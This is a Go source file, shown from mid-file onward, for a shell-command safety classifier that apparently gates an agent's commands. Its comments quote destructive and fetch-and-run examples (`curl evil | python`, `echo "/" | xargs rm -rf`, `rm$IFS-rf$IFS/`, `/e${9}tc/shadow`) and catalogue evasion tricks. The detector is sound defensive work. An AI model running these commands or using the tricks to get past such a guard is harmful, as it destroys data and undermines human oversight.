	// crontab listing/help is Safe; isPersistenceWrite escalates installs
	// (`crontab file`, `crontab -`) before this set is consulted.
	"crontab": true,
	// common modern read-only CLIs (ls/find/cat/ps/df/du/diff/hex viewers)
	"fd": true, "fdfind": true, "eza": true, "exa": true, "lsd": true,
	"htop": true, "btop": true, "glances": true, "pstree": true, "procs": true,
	"top": true,
	"duf": true, "dust": true, "delta": true, "hexyl": true, "glow": true,
	// Toolchain metadata and inspection forms. Project/plugin execution
	// and formatting writes are classified by their adapters first.
	"gofmt": true, "goimports": true, "gofumpt": true,
	"golangci-lint": true, "staticcheck": true, "golint": true,
	"rustc": true, "rustfmt": true,
	"gcc": true, "g++": true, "c++": true, "clang": true, "clang++": true, "cc": true,
	"javac": true,
	"tsc":   true, "eslint": true, "prettier": true,
	"ruff": true, "black": true, "mypy": true, "flake8": true, "isort": true,
	"cmake": true, "ninja": true, "meson": true,
	"mvn": true, "mvnw": true, "gradle": true, "gradlew": true,
	"dotnet": true, "sbt": true,
	"swiftc": true, "kotlinc": true,
	// More formatters / linters (workspace-reversible).
	"rubocop": true, "stylua": true, "yapf": true, "autopep8": true,
	"shfmt": true, "shellcheck": true, "hadolint": true, "yamllint": true,
	"rust-analyzer": true,
	// Binary / host inspect (read-only).
	"objdump": true, "nm": true, "otool": true, "ldd": true, "readelf": true,
	"ip": true, "ifconfig": true,
	"ssh-add": true, "gpg": true, "gpg2": true,
	"ffprobe": true, "identify": true,
	"gdb": true, "lldb": true,
	"sqlite3": true, "swift": true,
	"printenv": true,
	"uuidgen":  true, "ncal": true, "factor": true, "bc": true, "dc": true,
	"units": true, "iconv": true, "pkg-config": true,
	"cloc": true, "tokei": true, "scc": true,
	"protoc": true, "buf": true,
	"sysctl": true, "sync": true,
}

// ── Classifier ─────────────────────────────────────────────────────────

// Recursion bounds command substitutions and nested shell/eval payloads.
// Static variable expansion has its own byte bound in analysis.go.
const maxSubstDepth = 64

// Classify returns the highest-ranked display class from Analyze. Policy
// callers must use ActionForCommand so independent denials cannot be masked.
func Classify(cmd string) RiskClass {
	return Analyze(cmd).Class()
}

// classifyPipelineIn classifies one command segment that may contain pipes.
// Each pipe stage is classified independently — so `true | dd of=/dev/sda`
// is seen as the dd, not just the harmless `true` at the head — and a stage
// that pipes INTO a shell interpreter is treated as code execution
// (`curl … | bash`). The worst stage wins. repos carries the git
// working-directory context of each stage and must line up with the pipe
// stages; any other length is treated as unknown for every stage.
func classifyPipelineIn(tokens []string, repos []*gitRepoCtx) RiskClass {
	stages := splitPipes(tokens)
	if len(repos) != len(stages) {
		repos = make([]*gitRepoCtx, len(stages))
	}
	worst := Safe
	for idx, stage := range stages {
		// idx > 0 means this stage receives piped input from the previous one.
		worst = worstOf(worst, classifyStageIn(stage, idx > 0, repos[idx]))
		if idx > 0 {
			// A pipe-fed argv composer turns upstream stdout into command
			// arguments, so `echo "/" | xargs rm -rf` executes `rm -rf /`
			// even though no stage literally contains that command.
			worst = worstOf(worst, classifyArgvComposerSink(stages[:idx], stage, repos[idx]))
			// A pipe-fed shell executes its stdin as a script. When that
			// stdin is a static literal, classify the payload as a command
			// so `echo rm -rf / | sh` is destructive, not merely
			// code_execution (prompt).
			worst = worstOf(worst, classifyPipedShellSink(stages[:idx], stage))
		}
	}
	// File-fed xargs (`xargs -a paths rm -rf`, `xargs rm -rf < file`) is
	// the no-pipe analogue of `cat file | xargs rm -rf`: the real argv is
	// not on the command line, so a dangerous inner verb fails closed.
	if len(stages) == 1 {
		worst = worstOf(worst, classifyXargsFileInput(stages[0]))
	}
	return worst
}

// classifyArgvComposerSink handles a pipe stage whose command is reached
// through an argv composer (xargs / GNU parallel / xe) while receiving
// piped stdin. The composer appends each line of stdin to the inner command
// line, so the effective command is `inner <payload>…` even though the
// payload never appears as a token of the sink stage.
//
// When the upstream pipeline is a statically determinable literal producer
// (`echo <args>` / `printf <args>`) the payload tokens are composed onto the
// inner command and the composition is classified — `echo "/" | xargs rm -rf`
// then classifies exactly like `rm -rf /` (destructive). When the payload is
// not statically determinable (`cat file | …`, `find … | …`, variables) and
// the inner verb can turn a piped path into destructive or system-level
// damage, the pipeline fails closed as Unknown (deny-by-default): the same
// treatment an unrecognised verb gets, because the command that will actually
// run is unknowable at classification time.
func classifyArgvComposerSink(upstream [][]string, stage []string, repo *gitRepoCtx) RiskClass {
	inner, ok := argvComposerInnerCommand(stage)
	if !ok || len(inner) == 0 {
		return Safe
	}
	if payload, static := staticPipePayload(upstream); static {
		composed := make([]string, 0, len(inner)+len(payload))
		composed = append(composed, inner...)
		composed = append(composed, payload...)
		return classifyStageIn(composed, false, repo)
	}
	if xargsInnerDangerous(inner) {
		return Unknown
	}
	return Safe
}

// xargsInnerDangerous reports whether the command an argv composer runs is,
// once execution wrappers (nohup, timeout, env, sudo, command, …) are
// stripped, a verb that xargsDangerousVerb fails closed on. Without the
// unwrap `xargs nohup rm -rf` hid the real verb behind the wrapper.
func xargsInnerDangerous(inner []string) bool {
	if len(inner) == 0 {
		return false
	}
	if xargsDangerousVerb(commandName(inner[0])) {
		return true
	}
	unwrapped, _ := unwrapWrappers(inner)
	return len(unwrapped) > 0 && xargsDangerousVerb(commandName(unwrapped[0]))
}

// classifyPipedShellSink composes a statically determinable upstream
// payload onto a pipe-fed shell and classifies it as a command. Dynamic
// payloads stay at the CodeExecution floor already set by classifyStage.
// Unknown compositions are ignored so `echo hi | bash` does not degrade
// from code_execution (prompt) to unknown (deny).
func classifyPipedShellSink(upstream [][]string, stage []string) RiskClass {
	cmdTokens, _ := unwrapWrappers(stage)
	if len(cmdTokens) == 0 {
		return Safe
	}
	if !pipedShells[commandName(cmdTokens[0])] {
		return Safe
	}
	text, static := staticPipeText(upstream)
	text = strings.TrimSpace(strings.ReplaceAll(text, "\x00", " "))
	if !static || text == "" {
		return Safe
	}
	cls := Classify(text)
	if cls == Unknown {
		return Safe
	}
	return cls
}

// classifyXargsFileInput fails closed when a (non-pipe) xargs invocation
// reads its argv from a file or input redirect. `xargs -a paths rm -rf`
// and `xargs rm -rf < paths` execute whatever paths the file contains;
// like `cat paths | xargs rm -rf` that is Unknown when the inner verb is
// dangerous. A here-string (`<<< /`) already puts the payload on the
// command line, so it is not treated as an external source.
func classifyXargsFileInput(stage []string) RiskClass {
	inner, ok := argvComposerInnerCommand(stage)
	if !ok || len(inner) == 0 {
		return Safe
	}
	if !xargsHasExternalArgSource(stage) {
		return Safe
	}
	if xargsInnerDangerous(inner) {
		return Unknown
	}
	return Safe
}

func xargsHasExternalArgSource(tokens []string) bool {
	for _, t := range tokens {
		if t == "-a" || strings.HasPrefix(t, "--arg-file") {
			return true
		}
		// Fused short form: -apaths / -a/tmp/paths (but not --anything).
		if strings.HasPrefix(t, "-a") && !strings.HasPrefix(t, "--") && t != "-a" {
			return true
		}
		// GNU parallel file-backed argv: `:::: file` (and fused `::::file`).
		// Distinct from `::: args` which puts the payload on the command line.
		if t == "::::" || strings.HasPrefix(t, "::::") {
			return true
		}
		// Input redirect of a file. Here-strings (`<<<`) carry their
		// payload as a later token and are not external sources.
		if t == "<" || t == "<<" {
			return true
		}
		if strings.HasPrefix(t, "<") && !strings.HasPrefix(t, "<<<") {
			return true
		}
	}
	return false
}

// argvComposers turn stdin (or -a/--arg-file) lines into extra argv for
// an inner command. They share the xargs composition / fail-closed path.
var argvComposers = map[string]bool{
	"xargs":    true,
	"parallel": true,
	"xe":       true,
}

// argvComposerInnerCommand returns the tokens of the command an argv
// composer in the stage's leading wrapper chain will execute. ok reports
// whether such a composer was found; a bare xargs (default command is
// echo) yields an empty inner slice with ok=true.
func argvComposerInnerCommand(tokens []string) (inner []string, ok bool) {
	i := 0
	for i < len(tokens) && isAssignment(tokens[i]) {
		i++ // leading VAR=value assignment prefix
	}
	for i < len(tokens) {
		name := commandName(tokens[i])
		if argvComposers[name] {
			i++
			for i < len(tokens) {
				t := tokens[i]
				// GNU parallel `:::: file` is an argv source, not the inner
				// command. Skip it (and a fused `::::file`) so the real verb
				// is classified and the file source is still fail-closed.
				if t == "::::" && i+1 < len(tokens) {
					i += 2
					continue
				}
				if strings.HasPrefix(t, "::::") && t != "::::" {
					i++
					continue
				}
				if t == "--" {
					return tokens[i+1:], true
				}
				if !strings.HasPrefix(t, "-") || t == "-" {
					return tokens[i:], true
				}
				// Option flags. A value-taking option consumes its value so
				// the value is not mistaken for the inner command. `--replace`
				// without `=` does NOT take a value (`xargs --replace rm`
				// means replace-str defaults to `{}` and `rm` is the command);
				// `--replace=foo` carries its value in the word.
				_, i = wrapperSpecs[name].option(tokens, i)
			}
			return nil, true
		}
		step, isWrapper := wrapperAt(tokens, i)
		if !isWrapper {
			return nil, false
		}
		i = step.next
	}
	return nil, false
}

// staticPipePayload returns the literal tokens an upstream pipeline feeds
// into the sink's stdin when they are statically determinable: a single
// producer stage of `echo <args>` or `printf <args>` with no shell
// substitutions or variable expansions in its arguments. The tokens are the
// producer's decoded output split on whitespace and NUL, the way an argv
// composer splits its input. Anything else (file readers, find, command
// output, $VARS, multi-stage transforms) is not statically determinable and
// reports ok=false.
func staticPipePayload(upstream [][]string) (payload []string, ok bool) {
	text, ok := staticPipeText(upstream)
	if !ok {
		return nil, false
	}
	return strings.FieldsFunc(text, func(r rune) bool {
		return r == 0 || unicode.IsSpace(r)
	}), true
}

// staticPipeText returns the exact bytes a single `echo` / `printf` producer
// writes to the pipe, with backslash escapes and printf format directives
// decoded (both programs decode them before the sink sees the data). It
// reports ok=false whenever the output cannot be determined statically.
func staticPipeText(upstream [][]string) (text string, ok bool) {
	if len(upstream) != 1 {
		return "", false
	}
	stage := upstream[0]
	if len(stage) == 0 {
		return "", false
	}
	// `env echo / | xargs rm` and `command echo / | xargs rm` are the
	// same static producer as bare echo once wrappers are stripped.
	if unwrapped, _ := unwrapWrappers(stage); len(unwrapped) > 0 {
		stage = unwrapped
	}
	var args []string
	switch commandName(stage[0]) {
	case "echo":
		args = stage[1:]
		for len(args) > 0 && isEchoFlagCluster(args[0]) {
			args = args[1:]
		}
	case "printf":
		args = stage[1:]
		for len(args) > 0 && strings.HasPrefix(args[0], "-") {
			args = args[1:]
		}
	default:
		return "", false
	}
	for _, a := range args {
		// A token containing $ or a backtick expands at runtime, so the real
		// payload is not statically determinable.
		if strings.ContainsAny(a, "$`") {
			return "", false
		}
	}
	if commandName(stage[0]) == "printf" {
		return printfOutput(args)
	}
	// echo may interpret escapes (-e, or always in some shells), so decode
	// whenever a backslash is present; decoding is the stricter reading.
	joined := strings.Join(args, " ")
	if strings.Contains(joined, `\`) {
		var out []byte
		out, _ = decodeEscapes(out, joined, false)
		return string(out), true
	}
	return joined, true
}

// isEchoFlagCluster reports whether tok is an echo option such as -n, -e,
// -E, -ne or -neE.
func isEchoFlagCluster(tok string) bool {
	if len(tok) < 2 || tok[0] != '-' {
		return false
	}
	for _, r := range tok[1:] {
		if r != 'n' && r != 'e' && r != 'E' {
			return false
		}
	}
	return true
}

// decodeEscapes appends s to out with backslash escapes decoded as echo -e,
// printf %b and a printf format do. The second result is false when a `\c`
// escape cuts the output short. inFormat selects the printf-format flavour of
// octal escapes (`\NNN`); echo and %b also accept `\0NNN`.
func decodeEscapes(out []byte, s string, inFormat bool) ([]byte, bool) {
	for i := 0; i < len(s); {
		if s[i] != '\\' {
			out = append(out, s[i])
			i++
			continue
		}
		b, n, stop := decodeEchoEscape(s, i, inFormat)
		out = append(out, b...)
		if stop {
			return out, false
		}
		i += n
	}
	return out, true
}

// decodeEchoEscape decodes the single backslash escape starting at s[i] and
// returns its bytes and the number of input bytes it spans.
func decodeEchoEscape(s string, i int, inFormat bool) (out []byte, n int, stop bool) {
	if i+1 >= len(s) {
		return []byte{'\\'}, 1, false
	}
	c := s[i+1]
	switch {
	case c == 'a':
		return []byte{7}, 2, false
	case c == 'b':
		return []byte{8}, 2, false
	case c == 'f':
		return []byte{12}, 2, false
	case c == 'n':
		return []byte{10}, 2, false
	case c == 'r':
		return []byte{13}, 2, false
	case c == 't':
		return []byte{9}, 2, false
	case c == 'v':
		return []byte{11}, 2, false
	case c == 'e' || c == 'E':
		return []byte{27}, 2, false
	case c == 'c':
		return nil, 2, true
	case c == '\\' || c == '"' || c == '\'':
		return []byte{c}, 2, false
	case c == 'x' || c == 'u' || c == 'U':
		limit := 2
		switch c {
		case 'u':
			limit = 4
		case 'U':
			limit = 8
		}
		v, digits := 0, 0
		for digits < limit && i+2+digits < len(s) && isHexDigit(s[i+2+digits]) {
			v = v*16 + hexDigitValue(s[i+2+digits])
			digits++
		}
		if digits == 0 || (c != 'x' && v > unicode.MaxRune) {
			return []byte{'\\', c}, 2, false
		}
		if c == 'x' {
			return []byte{byte(v)}, 2 + digits, false
		}
		return utf8.AppendRune(nil, rune(v)), 2 + digits, false
	case c >= '0' && c <= '7':
		// printf formats take up to three octal digits including the
		// first; echo -e and %b take `\0` plus up to three more.
		start := i + 1
		if c == '0' && !inFormat {
			start = i + 2
		}
		v, digits := 0, 0
		for digits < 3 && start+digits < len(s) && s[start+digits] >= '0' && s[start+digits] <= '7' {
			v = v*8 + int(s[start+digits]-'0')
			digits++
		}
		return []byte{byte(v)}, start + digits - i, false
	}
	return []byte{'\\', c}, 2, false
}

func isHexDigit(b byte) bool {
	return (b >= '0' && b <= '9') || (b >= 'a' && b <= 'f') || (b >= 'A' && b <= 'F')
}

func hexDigitValue(b byte) int {
	switch {
	case b >= '0' && b <= '9':
		return int(b - '0')
	case b >= 'a' && b <= 'f':
		return int(b-'a') + 10
	}
	return int(b-'A') + 10
}

// printfOutput expands `printf FORMAT [ARG…]`: the format is decoded and
// re-applied until every argument is consumed. Directives it does not model
// (`*` widths, unknown conversions) report ok=false so the caller treats the
// output as undeterminable.
func printfOutput(args []string) (string, bool) {
	if len(args) == 0 {
		return "", true
	}
	format, rest := args[0], args[1:]
	var out []byte
	for {
		var consumed int
		var stop, ok bool
		out, consumed, stop, ok = printfPass(out, format, rest)
		if !ok {
			return "", false
		}
		if stop || consumed == 0 || consumed >= len(rest) || len(out) > 1<<16 {
			break
		}
		rest = rest[consumed:]
	}
	return string(out), true
}

// printfPass applies the format once, returning how many arguments the
// directives consumed and whether a `\c` escape ended the output.
func printfPass(out []byte, format string, rest []string) ([]byte, int, bool, bool) {
	consumed := 0
	next := func() string {
		if consumed < len(rest) {
			consumed++
			return rest[consumed-1]
		}
		return ""
	}
	for i := 0; i < len(format); i++ {
		switch c := format[i]; c {
		case '\\':
			b, n, stop := decodeEchoEscape(format, i, true)
			out = append(out, b...)
			if stop {
				return out, consumed, true, true
			}
			i += n - 1
		case '%':
			i++
			if i < len(format) && format[i] == '%' {
				out = append(out, '%')
				continue
			}
			for i < len(format) && strings.IndexByte("-+ #0123456789.", format[i]) >= 0 {
				i++
			}
			if i >= len(format) {
				return out, consumed, false, false
			}
			switch format[i] {
			case 's', 'q', 'd', 'i', 'u', 'x', 'X', 'o', 'e', 'E', 'f', 'F', 'g', 'G', 'a', 'A':
				out = append(out, next()...)
			case 'c':
				if arg := next(); arg != "" {
					_, n := utf8.DecodeRuneInString(arg)
					out = append(out, arg[:n]...)
				}
			case 'b':
				var cont bool
				out, cont = decodeEscapes(out, next(), false)
				if !cont {
					return out, consumed, true, true
				}
			default:
				return out, consumed, false, false
			}
		default:
			out = append(out, c)
		}
	}
	return out, consumed, false, true
}

// xargsDangerousVerb reports whether a verb invoked through pipe-fed xargs
// can turn an undeterminable piped path into destructive or system-level
// damage. For these the pipeline fails closed (Unknown) when the payload
// cannot be composed statically; benign verbs (grep, wc, …) are unaffected.
func xargsDangerousVerb(name string) bool {
	switch name {
	case "rm", "shred", "dd",
		"chmod", "chown", "chgrp", "chattr",
		"mv", "cp", "ln", "install", "tee":
		return true
	}
	return destructivePrefixes[name]
}

// classifyStage classifies a single pipe stage. It first strips leading
// execution wrappers (sudo/env/xargs/nohup/timeout/…) so the real command
// underneath is the one classified, while privileged wrappers still set a
// system_write floor. It then escalates for shell `-c` payloads, `find
// -exec`, and any reverse-shell or sensitive-resource tokens in the stage.
// pipedInto reports whether the stage's stdin comes from an upstream pipe, in
// which case feeding it to a shell interpreter is code execution.
func classifyStage(tokens []string, pipedInto bool) RiskClass {
	return classifyStageIn(tokens, pipedInto, nil)
}

// classifyStageIn is classifyStage with the working-directory context of the
// stage. A nil repo means the directory is unknown, so git verbs whose risk
// depends on the repository state fail closed.
func classifyStageIn(tokens []string, pipedInto bool, repo *gitRepoCtx) RiskClass {
	if len(tokens) == 0 {
		return Safe
	}
	// Bare `env` / `printenv` dumps the full process environment, including
	// secrets not covered by redaction patterns. Treat it as system_write so
	// it requires approval in interactive modes and is denied by default in
	// non-interactive mode.
	if isEnvironmentDump(tokens) {
		return SystemWrite
	}
	// Shell-builtin dumps: bare `set`, `export -p`, `declare -p`, and
	// `typeset -p` print the full environment / all shell variables,
	// including secrets not covered by redaction patterns. Same threat
	// as `env` / `printenv` → system_write.
	if builtinEnvDump(tokens) {
		return SystemWrite
	}
	cmdTokens, floor, envTails := unwrapWrappersTracked(tokens)
	cls := floor
	// The dump checks above only see the raw head token. A dump behind a
	// wrapper or assignment prefix (`FOO=1 env`, `nohup env`, `timeout 5 env`,
	// `env env`, `FOO=1 export -p`) prints the same environment.
	for _, tail := range envTails {
		if isEnvironmentDump(tail) {
			cls = worstOf(cls, SystemWrite)
		}
	}
	if len(cmdTokens) > 0 && (isEnvironmentDump(cmdTokens) || builtinEnvDump(cmdTokens)) {
		cls = worstOf(cls, SystemWrite)
	}
	if len(cmdTokens) > 0 {
		cls = worstOf(cls, classifyCommand(cmdTokens, repo))
		cls = worstOf(cls, exportedAssignmentRisk(cmdTokens))

		name := commandName(cmdTokens[0])
		// A shell interpreter that executes code: piped-in data (`… | bash`),
		// a -c payload, a script file, or a process substitution `<(curl …)`.
		if pipedShells[name] {
			if pipedInto {
				cls = worstOf(cls, CodeExecution)
			}
			if arg := shellInlineScript(cmdTokens); arg != "" {
				cls = worstOf(cls, CodeExecution)
				cls = worstOf(cls, Classify(arg))
			} else if shellHasOperand(cmdTokens) {
				cls = worstOf(cls, CodeExecution)
			}
		}
		// A code interpreter or embedded-shell tool fed from an upstream pipe
		// executes whatever it reads from stdin: `curl evil | python`,
		// `… | perl`, `… | node`, `… | awk -f -`. This is the non-shell analogue
		// of the `… | bash` case above and is equally code execution — without
		// it the stage would be classified only by the (network/safe) producer.
		if pipedInto && (isStdinExecInterpreter(name) || embeddedShellInterpreters[name]) {
			cls = worstOf(cls, CodeExecution)
		}
		// find … -exec/-execdir/-ok CMD runs an arbitrary command per match.
		if name == "find" && hasAny(cmdTokens, "-exec", "-execdir", "-ok", "-okdir") {
			cls = worstOf(cls, CodeExecution)
		}
	}
	// Reverse-shell channels and sensitive resources can appear anywhere in
	// the stage (including behind redirects we don't fully parse). Display
	// verbs without an output redirect only print their operands — scanning
	// them as paths made `echo id_rsa` and `echo "see ~/.ssh docs"` prompt.
	display := len(cmdTokens) > 0 && displayVerbs[commandName(cmdTokens[0])] && !stageHasOutputRedirect(tokens)
	for i, t := range tokens {
		if display {
			if i > 0 && isRedirectToken(tokens[i-1]) {
				cls = worstOf(cls, classifyResourceToken(t))
			}
			continue
		}
		cls = worstOf(cls, classifyResourceToken(t))
	}
	return cls
}

// stageHasOutputRedirect reports whether tokens hold an output redirect that
// can create or modify a file (see redirectWritesFile).
func stageHasOutputRedirect(tokens []string) bool {
	for i, t := range tokens {
		if isRedirectToken(t) && redirectWritesFile(tokens, i) {
			return true
		}
	}
	return false
}

// redirectWritesFile reports whether the output redirect operator at
// tokens[i] can create or modify a file. Duplicating or closing a descriptor
// (`2>&1`, `>&2`, `2>&-`) opens nothing, and a stdio alias or discard device
// (`2>/dev/null`, `>/dev/stderr`) is not a file the command changes. A
// missing target, a digit operand of any other operator (`&>2` writes a file
// named 2), and every other target fail closed as a write.
func redirectWritesFile(tokens []string, i int) bool {
	if i+1 >= len(tokens) {
		return true
	}
	target := tokens[i+1]
	if tokens[i] == ">&" && (isAllDigits(target) || target == "-") {
		return false
	}
	return !isDirectBenignDevice(target)
}

// isStdinExecInterpreter reports whether name is a program that executes
// a script from stdin when fed a pipe. It covers the explicit set plus
// versioned names (`python3.12`, `lua5.4`) so `curl x | python3.12` is
// code_execution rather than unknown.
func isStdinExecInterpreter(name string) bool {
	if stdinExecInterpreters[name] {
		return true
	}
	if strings.HasPrefix(name, "python") {
		rest := strings.TrimPrefix(name, "python")
		if rest == "" || rest[0] == '3' || rest[0] == '2' {
			return true
		}
	}
	if strings.HasPrefix(name, "lua") {
		rest := strings.TrimPrefix(name, "lua")
		return rest == "" || (rest[0] >= '0' && rest[0] <= '9')
	}
	return false
}

// isScriptEvalInterpreter reports whether name is a language runtime that
// executes a script file or an inline -e/-c payload. Distinct from
// stdinExecInterpreters because that set includes bun/deno, which are
// package-manager CLIs first — `bun install` must not take the
// interpreterRunsCode path. lua/osascript/ipython live in the stdin set
// (pipe-fed execution) but were previously missing from codeEvalPrefixes,
// so `lua -e '…'` / `osascript -e '…'` / `ipython -c '…'` classified Safe.
func isScriptEvalInterpreter(name string) bool {
	if codeEvalPrefixes[name] {
		return true
	}
	switch name {
	case "luajit", "osascript", "ipython":
		return true
	}
	if strings.HasPrefix(name, "python") {
		rest := strings.TrimPrefix(name, "python")
		if rest == "" || rest[0] == '3' || rest[0] == '2' {
			return true
		}
	}
	if strings.HasPrefix(name, "lua") {
		rest := strings.TrimPrefix(name, "lua")
		return rest == "" || (rest[0] >= '0' && rest[0] <= '9')
	}
	return false
}

// builtinEnvDump reports whether tokens are a shell-builtin invocation
// that prints the environment or all shell variables: bare `set`,
// `set -o`, and `export`/`declare`/`typeset` with no operands (bare, or
// only flags such as `-p` / `-x`). Setting variables or options (`export FOO=bar`,
// `set -e`, `declare -i x=5`) is not a dump.
func builtinEnvDump(tokens []string) bool {
	if len(tokens) == 0 {
		return false
	}
	switch commandName(tokens[0]) {
	case "set":
		if len(tokens) == 1 {
			return true
		}
		// `set -o` prints all options; `set -o errexit` sets one.
		return len(tokens) == 2 && tokens[1] == "-o"
	case "export", "declare", "typeset":
		sawFunc := false
		flagOnly := true
		for _, t := range tokens[1:] {
			if strings.HasPrefix(t, "-") {
				if strings.ContainsAny(t, "fF") {
					sawFunc = true
				}
				continue
			}
			if isAssignment(t) {
				// `declare -x FOO=bar` declares, not dumps.
				flagOnly = false
				continue
			}
			// A name operand in print mode is a targeted query, not a dump.
			return false
		}
		// Flag-only `-p` / `-x` and bare `export` / `declare` / `typeset`
		// list every (exported) variable. Any assignment makes it a
		// declaration instead; only the function-listing flags (-f / -F)
		// print something other than variables.
		return flagOnly && !sawFunc
	}
	return false
}

// isEnvironmentDump reports whether tokens represent a bare `env` or
// `printenv` invocation whose only effect is to dump the process environment.
// `env FOO=bar cmd ...` is NOT a dump (the real command is classified
// separately after unwrapWrappers strips env); `env`, `env -i`,
// `env -u SECRET`, `env --unset=SECRET` (equals-form long options), and
// `printenv` are dumps.
func isEnvironmentDump(tokens []string) bool {
	if len(tokens) == 0 {
		return false
	}
	name := commandName(tokens[0])
	if name == "printenv" {
		return printenvDumpsAll(tokens)
	}
	if name != "env" {
		return false
	}
	for i := 1; i < len(tokens); {
		t := tokens[i]
		if isAssignment(t) {
			i++
			continue
		}
		if t == "-i" || t == "--ignore-environment" ||
			t == "-0" || t == "--null" ||
			t == "--help" || t == "--version" {
			i++
			continue
		}
		if o, next, ok := wrapperSpecs["env"].valueOption(tokens, i); ok {
			if o.is("--split-string") {
				// -S STRING supplies the command env runs; it is not a
				// flag-only invocation, and unwrapWrappers classifies it.
				return false
			}
			i = next
			continue
		}
		// Equals-form long options carry their value inside the token
		// (`env --unset=HOME`, `env --chdir=/tmp`): they are env
		// manipulation, not the start of a wrapped command. unwrapWrappers
		// strips any dash-prefixed token as a wrapper flag, so recognising
		// them here too keeps both layers in agreement — a flag-only `env`
		// invocation (a pure environment dump) can no longer degrade to
		// Safe by hiding its flags inside equals-form tokens.
		if strings.HasPrefix(t, "--") && strings.Contains(t, "=") {
			i++
			continue
		}
		// Anything else is the real command being wrapped.
		return false
	}
	return true
}

// ── Normalisation (evasion neutralisation) ────────────────────────────
//
// normalize returns the command rewritten so the token-level pipeline can
// see through common evasion tricks, plus a list of additional commands
// that were extracted from $(...) / `...` substitutions. Each substitution
// is the body the shell would itself execute, so it must be classified in
// its own right.
//
// The transformations are intentionally conservative: each one matches a
// shell behaviour that is well-defined and not affected by the surrounding
// quoting style we already track.
func normalize(cmd string) (string, []string) {
	cmd = joinLineContinuations(cmd)
	cmd = consumeHeredocs(cmd)
	cmd = stripComments(cmd)
	cmd = decodeANSIC(cmd)
	cmd = expandIFS(cmd)
	cmd = expandBraces(cmd)
	cmd, subs := extractSubstitutions(cmd)
	cmd = stripCommandWrappers(cmd)
	cmd = collapseUnquotedBackslashes(cmd)
	return cmd, subs
}

// expandIFS replaces $IFS / ${IFS} with a literal space. The shell expands
// $IFS to its default value (space/tab/newline) on word splitting, so
// `rm$IFS-rf$IFS/` runs as `rm -rf /`. We only expand IFS — other env
// vars may legitimately hold arbitrary values and replacing them blindly
// would create false negatives.
var reIFS = regexp.MustCompile(`\$\{IFS\}|\$IFS\b`)

func expandIFS(cmd string) string {
	return reIFS.ReplaceAllString(cmd, " ")
}

// extractSubstitutions pulls out $(...) and `...` substitutions and
// replaces each with a single safe placeholder token. The extracted
// bodies are returned as additional commands to classify.
//
// $(...) handling tracks nesting so $(echo $(echo rm)) extracts both the
// inner and outer bodies. Backticks do not nest in POSIX shells, so we
// just pair the next two unescaped backticks.
func extractSubstitutions(cmd string) (string, []string) {
	budget := 8*len(cmd) + 4096
	return extractSubstitutionsBounded(cmd, &budget, 0)
}

// unanalysableSubstitution is the extra body recorded when substitution
// scanning exceeds its work bound. No such program exists, so the analysis of
// the body classifies Unknown and the command is denied by default.
const unanalysableSubstitution = "odek-unanalysable-substitution"

// maxArithNesting bounds how many nested $(( … )) levels are unwrapped in
// place; deeper arithmetic is treated as a command substitution, which the
// recursion-depth bound then fails closed.
const maxArithNesting = 8

// extractSubstitutionsBounded is extractSubstitutions with an explicit scan
// budget shared across nested arithmetic bodies. Matching a substitution
// costs its length and the scan then jumps past it, so well-formed input
// stays linear; unterminated openers that re-scan the tail are what exhaust
// the budget, and exhausting it records unanalysableSubstitution.
func extractSubstitutionsBounded(cmd string, budget *int, arith int) (string, []string) {
	var out strings.Builder
	var subs []string
	inDouble := false

	i := 0
	for i < len(cmd) {
		// Inside double quotes a backslash escapes the next character:
		// `\"` is a literal quote that must NOT toggle the double-quote
		// state (same for \\, \$, \`). Without this, a single escaped
		// quote desyncs the quote state and a later single-quoted span
		// can hide a substitution body from extraction.
		if cmd[i] == '\\' && inDouble && i+1 < len(cmd) &&
			(cmd[i+1] == '"' || cmd[i+1] == '\\' || cmd[i+1] == '$' || cmd[i+1] == '`') {
			out.WriteString(cmd[i : i+2])
			i += 2
			continue
		}
		// Double quotes toggle expansion context: inside them a `'` is data,
		// not a quote span (so an apostrophe in a double-quoted argument
		// cannot open a bogus single-quote span and hide later $()/backtick
		// bodies), while $(...) and `...` still expand and must be extracted.
		if cmd[i] == '"' {
			inDouble = !inDouble
			out.WriteByte(cmd[i])
			i++
			continue
		}
		// Skip over single-quoted spans — substitutions inside ' ... '
		// do not expand in real shells either.
		if cmd[i] == '\'' && !inDouble {
			j := strings.IndexByte(cmd[i+1:], '\'')
			if j < 0 {
				// Unterminated single quote. A real shell rejects the line,
				// but returning early here (the old behaviour) let a single
				// stray apostrophe — e.g. one inside a double-quoted
				// argument of an earlier token, or a \' escape — skip
				// extraction of every later $(...)/`...` body. Keep
				// scanning as if unquoted so those bodies are still
				// extracted and classified (fail-closed).
				out.WriteByte(cmd[i])
				i++
				continue
			}
			out.WriteString(cmd[i : i+1+j+1])
			i += 1 + j + 1
			continue
		}

		// Outside quotes a backslash escapes the next character: \' is a
		// literal quote (not a span opener) and \$ / \` are literal text
		// (not substitutions). Inside double quotes the main loop keeps
		// backslashes verbatim, matching shell behaviour closely enough —
		// any $(...) there still expands and is still extracted below.
		if cmd[i] == '\\' && !inDouble && i+1 < len(cmd) {
			out.WriteString(cmd[i : i+2])
			i += 2
			continue
		}
		// Positional parameters and $@ / $* are empty in a one-shot command
		// line, so glued into a word (`/e${9}tc/shadow`) they vanish and the
		// shell sees the plain path. A parameter that is a whole word of its
		// own is left as the dynamic operand it is.
		if cmd[i] == '$' {
			if n := emptyPositionalLen(cmd[i:]); n > 0 && (i > 0 && wordGlue(cmd[i-1]) || i+n < len(cmd) && wordGlue(cmd[i+n])) {
				i += n
				continue
			}
		}
		// $(...) command substitution and <(...) / >(...) process
		// substitution all run their body as a command. Treat them alike.
		if i+1 < len(cmd) && (cmd[i] == '$' || cmd[i] == '<' || cmd[i] == '>') && cmd[i+1] == '(' {
			depth := 1
			j := i + 2
			for j < len(cmd) && depth > 0 {
				if *budget--; *budget < 0 {
					return out.String(), append(subs, unanalysableSubstitution)
				}
				switch cmd[j] {
				case '(':
					depth++
					j++
				case ')':
					depth--
					if depth == 0 {
						break
					}
					j++
				default:
					j++
				}
			}
			if depth == 0 && j < len(cmd) {
				body := cmd[i+2 : j]
				if cmd[i] == '$' {
					if inner, ok := arithmeticBody(body); ok && arith < maxArithNesting {
						// $(( … )) is arithmetic and runs nothing itself;
						// only a substitution nested in it can execute.
						_, nested := extractSubstitutionsBounded(inner, budget, arith+1)
						subs = append(subs, nested...)
						out.WriteByte('0')
						i = j + 1
						continue
					}
				}
				subs = append(subs, body)
				value := substValue(body)
				if cmd[i] != '$' {
					value = procSubstToken
				}
				spliceSubstitution(&out, value, cmd, j+1)
				i = j + 1
				continue
			}
